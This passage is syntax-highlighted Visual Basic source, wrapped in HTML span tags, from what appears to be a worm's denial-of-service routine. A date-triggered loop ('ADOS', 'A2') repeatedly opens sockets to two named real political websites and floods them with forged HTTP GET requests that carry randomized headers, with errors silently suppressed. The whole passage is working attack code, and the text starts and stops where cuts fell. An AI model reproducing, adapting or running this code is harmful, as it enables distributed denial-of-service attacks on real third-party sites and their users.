</span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">WSACleanup</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">ADOS</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Day</span><span class="sc6">(</span><span class="sc3">Date</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;</span><span class="sc0"> </span><span class="sc2">25</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc3">Do</span><span class="sc0">
</span><span class="sc7">DoEvents</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Minute</span><span class="sc6">(</span><span class="sc7">Time</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">iStat</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">A2</span><span class="sc0"> </span><span class="sc3">Else</span><span class="sc0"> </span><span class="sc7">Sleep</span><span class="sc0"> </span><span class="sc2">60000</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Loop</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">A2</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">aSock</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
</span><span class="sc3">Do</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc3">Not</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">StartWinsock</span><span class="sc6">())</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc3">Not</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">iStat</span><span class="sc6">())</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">EndWinsock</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc7">DoEvents</span><span class="sc0">
</span><span class="sc7">Randomize</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">aSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ConnectSock</span><span class="sc6">(</span><span class="sc4">"www.georgewbush.com"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Form1.hWnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">80</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1080</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">ElseIf</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">aSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ConnectSock</span><span class="sc6">(</span><span class="sc4">"www.fujimoriextraditable.com.pe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Form1.hWnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">80</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1080</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc7">Sleep</span><span class="sc0"> </span><span class="sc2">2000</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">SendData</span><span class="sc6">(</span><span class="sc7">aSock</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">GetHTTP</span><span class="sc6">(</span><span class="sc4">"www.georgewbush.com"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">ElseIf</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">SendData</span><span class="sc6">(</span><span class="sc7">aSock</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">GetHTTP</span><span class="sc6">(</span><span class="sc4">"www.fujimoriextraditable.com.pe"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc7">Sleep</span><span class="sc0"> </span><span class="sc2">3000</span><span class="sc0">
</span><span class="sc7">closesocket</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">aSock</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Loop</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">EndWinsock</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetHostByNameAlias</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hostname</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">rgn</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">addrList</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">rIP</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">getHost</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">HostEnt</span><span class="sc0">

</span><span class="sc7">rIP</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">inet_addr</span><span class="sc6">(</span><span class="sc7">hostname</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">rIP</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INADDR_NONE</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
 </span><span class="sc7">rgn</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">gethostbyname</span><span class="sc6">(</span><span class="sc7">hostname</span><span class="sc6">)</span><span class="sc0">
  </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">rgn</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
    </span><span class="sc7">MemCopy</span><span class="sc0"> </span><span class="sc7">getHost</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">rgn</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">hostent_size</span><span class="sc0">
    </span><span class="sc7">MemCopy</span><span class="sc0"> </span><span class="sc7">addrList</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">getHost.h_addr_list</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc7">MemCopy</span><span class="sc0"> </span><span class="sc7">rIP</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">addrList</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">getHost.h_length</span><span class="sc0">
    </span><span class="sc3">Else</span><span class="sc0">
    </span><span class="sc7">rIP</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INADDR_NONE</span><span class="sc0">
  </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
    
</span><span class="sc7">GetHostByNameAlias</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">rIP</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">ConnectSock</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">Host</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">HWndToMsg</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">port</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">m</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">nmsg</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">SelectOps</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sockin</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">sockaddr</span><span class="sc0">

</span><span class="sc7">sockin.sin_family</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">AF_INET</span><span class="sc0">
</span><span class="sc7">sockin.sin_port</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">htons</span><span class="sc6">(</span><span class="sc7">port</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">sockin.sin_port</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">ConnectSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc7">sockin.sin_addr</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetHostByNameAlias</span><span class="sc6">(</span><span class="sc7">Host</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">sockin.sin_addr</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INADDR_NONE</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">ConnectSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">socket</span><span class="sc6">(</span><span class="sc7">AF_INET</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">SOCK_STREAM</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">IPPROTO_TCP</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&lt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">ConnectSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">SetSockLinger</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">SOCKET_ERROR</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">ConnectSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">m</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
 </span><span class="sc7">SelectOps</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FD_READ</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc7">FD_CONNECT</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc7">FD_CLOSE</span><span class="sc0">
 
 </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">WSAAsyncSelect</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">HWndToMsg</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">nmsg</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">SelectOps</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">ConnectSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
 </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
 
 </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">connect</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sockin</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sockaddr_size</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc7">SOCKET_ERROR</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">ConnectSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
 </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
 
</span><span class="sc3">Else</span><span class="sc0">
 
 </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">connect</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sockin</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sockaddr_size</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">SOCKET_ERROR</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">ConnectSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
 </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
    
</span><span class="sc7">ConnectSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">SetSockLinger</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">SockNum</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">OnOff</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">LingerTime</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">

</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">Linger</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">LingerType</span><span class="sc0">
 </span><span class="sc7">Linger.l_onoff</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">OnOff</span><span class="sc0">
 </span><span class="sc7">Linger.l_linger</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">LingerTime</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">setsockopt</span><span class="sc6">(</span><span class="sc7">SockNum</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">SOL_SOCKET</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">SO_LINGER</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Linger</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">SetSockLinger</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">SOCKET_ERROR</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
        
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">getsockopt</span><span class="sc6">(</span><span class="sc7">SockNum</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">SOL_SOCKET</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">SO_LINGER</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Linger</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">SetSockLinger</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">SOCKET_ERROR</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">SendData</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vMessage</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Variant</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">TheMsg</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc0">
            </span><span class="sc7">TheMsg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">StrConv</span><span class="sc6">(</span><span class="sc7">vMessage</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbFromUnicode</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">TheMsg</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
    </span><span class="sc7">SendData</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">send</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">TheMsg</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">TheMsg</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc7">LBound</span><span class="sc6">(</span><span class="sc7">TheMsg</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetHTTP</span><span class="sc6">(</span><span class="sc7">URL</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">Randomize</span><span class="sc0">
</span><span class="sc7">GetHTTP</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"GET / HTTP/1.1"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0">
</span><span class="sc7">Ar1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Array</span><span class="sc6">(</span><span class="sc4">"image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/msword, application/vnd.ms-powerpoint, application/x-shockwave-flash, */*"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"*/*"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">GetHTTP</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetHTTP</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Accept: "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Ar1</span><span class="sc6">(</span><span class="sc7">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">Ar1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)))</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0">
